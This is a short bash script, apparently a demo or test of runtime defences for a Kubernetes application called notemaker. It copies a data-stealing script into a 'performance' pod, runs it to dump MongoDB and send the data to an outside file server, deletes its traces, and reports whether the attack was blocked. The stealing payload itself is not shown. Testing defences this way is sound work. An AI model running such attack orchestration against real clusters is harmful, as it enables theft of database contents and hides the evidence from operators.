#!/bin/bash

echo "-----------------  DATA LOSS ATTACK  ---------------------" 
echo "---- retrieving all data from mongodb and sending it  ----"
echo "---        to my file server in Mongolia              ----"

cp all_data_steal.sh remote.sh

pod=$(kubectl get pods -n notemaker | grep performance | awk '{print $1}')

echo "--- deploy steal data attack payload into performance-meter container   ----"
kubectl cp remote.sh notemaker/$pod:/home/

echo "--- run it to dump mongodb db and send out all the data --"
response=$(kubectl exec -it -n notemaker $pod -- sh -c "/home/remote.sh")

sleep 3

block=$(kubectl get pods -n notemaker | grep perf | egrep 'Error|Crash')
if [[ ! -z "$block" ]]; then
   kubectl get pods -n notemaker | grep perf 
   echo "------------- DATALOSS ATTACK FAILED -------------------"
   exit 1
fi

echo "--- cover tracks"
kubectl exec -it -n notemaker $pod -- sh -c "cd /home ; rm remote.sh dump.tar.gz ; rm -rf dump"

attackFailed=$(echo $response | grep "Operation not permitted")

if [[ -n "$attackFailed" ]]; then
  echo "*****    attempt of sending out all data prevented   *****"
  echo "---------------- DATA LOSS ATTACK FAILED -----------------"
else
  echo "+++ sending all db data succeeded - COMPLETE DATA LOSS"
  echo "!--------------- DATA LOSS ATTACK SUCCESSFUL -------------"
fi
echo
 
